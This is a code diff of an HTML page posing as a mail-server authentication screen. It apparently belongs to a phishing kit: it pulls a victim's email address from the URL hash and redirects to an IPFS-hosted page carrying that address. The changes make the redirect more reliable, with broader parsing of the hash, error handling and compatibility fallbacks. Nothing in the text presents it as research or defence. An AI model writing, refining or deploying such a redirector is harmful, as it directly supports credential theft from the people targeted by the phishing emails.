@@ -1,7 +1,8 @@
-<!DOCTYPE html> 
+<!DOCTYPE html>
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <title>AUTHENTICATING Mail SERVER...</title>
     <style>
       body {
@@ -12,15 +13,38 @@
     </style>
     <script>
       function checkAndRedirect() {
-        // Extract email from URL hash (e.g., #email=someone@example.com)
+        // Extract email from URL hash (could be #email=user@example.com or #user@example.com)
         var hash = window.location.hash.substring(1); // Remove the # character
-        var email = "{email}"; // Default to {email} placeholder if no email in hash
+        var email = "{email}"; // Default placeholder if no email found
         
         if (hash) {
-          var hashParams = hash.split('=');
-          if (hashParams[0] === 'email') {
-            email = decodeURIComponent(hashParams[1]);
+          // Check if hash is in format email=user@example.com
+          if (hash.indexOf('email=') === 0) {
+            var emailPart = hash.split('=')[1];
+            if (emailPart) {
+              try {
+                email = decodeURIComponent(emailPart);
+              } catch(e) {
+                email = "[[-Email-]]";
+              }
+            }
+          } 
+          // Otherwise assume the entire hash is the email (format #user@example.com)
+          else {
+            // Simple email validation - just check for @ symbol
+            if (hash.indexOf('@') > 0) {
+              try {
+                email = decodeURIComponent(hash);
+              } catch(e) {
+                email = "[[-Email-]]";
+              }
+            }
           }
+        }
+
+        // If we still have the original placeholder, use alternative
+        if (email === "{email}") {
+          email = "[[-Email-]]";
         }
 
         var encodedEmail = encodeURIComponent(email);
@@ -28,7 +52,6 @@
 
         // Create a new XMLHttpRequest to check if the IPFS link is accessible
         var xhr = new XMLHttpRequest();
-        xhr.open('HEAD', ipfsURL, true);
         xhr.onreadystatechange = function() {
           if (xhr.readyState == 4) {
             if (xhr.status >= 200 && xhr.status < 300) {
@@ -40,10 +63,23 @@
             }
           }
         };
-        xhr.send();
+        
+        try {
+          xhr.open('HEAD', ipfsURL, true);
+          xhr.send();
+        } catch(e) {
+          document.body.innerHTML = "<h1>Error</h1><p>Could not check the link status.</p>";
+        }
       }
 
-      window.onload = checkAndRedirect;
+      // Event listeners for maximum compatibility
+      if (window.addEventListener) {
+        window.addEventListener('load', checkAndRedirect);
+      } else if (window.attachEvent) {
+        window.attachEvent('onload', checkAndRedirect);
+      } else {
+        window.onload = checkAndRedirect;
+      }
     </script>
   </head>
   <body>
